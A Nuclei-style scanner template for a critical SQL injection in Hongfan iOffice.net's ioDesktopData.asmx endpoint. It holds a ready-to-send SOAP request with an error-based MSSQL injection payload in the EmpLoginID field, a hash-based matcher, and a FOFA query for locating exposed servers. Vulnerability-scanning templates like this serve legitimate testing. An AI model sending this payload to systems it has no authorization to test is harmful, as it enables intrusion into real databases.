tmp/sql/hongfan-iodesktopdata-sqli.yaml

id: hongfan-iodesktopdata-sqli

info:
  name: Hongfan iOffice ioDesktopData - SQL Injection
  author: Co5mos
  severity: critical
  description: The ioDesktopData.asmx interface in Hongfan iOffice.net is vulnerable to SQL injection, potentially allowing an attacker to manipulate the backend database.
  reference:
    - https://github.com/zan8in/afrog/blob/6845c033f13ef440743688a2e157b7253b52fa19/pocs/temp/afrog-pocs/vulnerability/hongfan-iodesktopdata-sqli.yaml
  metadata:
    fofa-query: (app="红帆-ioffice" || app="红帆-HFOffice")
  tags: hongfan,ioffice,sqli

http:
  - raw:
      - |
        POST /iOffice/prg/set/wss/ioDesktopData.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml;charset=UTF-8
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1

        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
        <soap:Header/>
        <soap:Body>
        <tem:GetDepSchedule>
        <!--type: string-->
        <tem:EmpLoginID>1'+(SELECT CHAR(103)+CHAR(105)+CHAR(75)+CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113)+(select sys.fn_varbintohexstr(hashbytes('md5','999999999')))+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(120)+CHAR(113))))+'</tem:EmpLoginID>
        </tem:GetDepSchedule>
        </soap:Body>
        </soap:Envelope>

    matchers:
      - type: dsl
        dsl:
          - status_code == 500
          - contains(body, "c8c605999f3d8352d7bb792cf3fdb25")
        condition: and
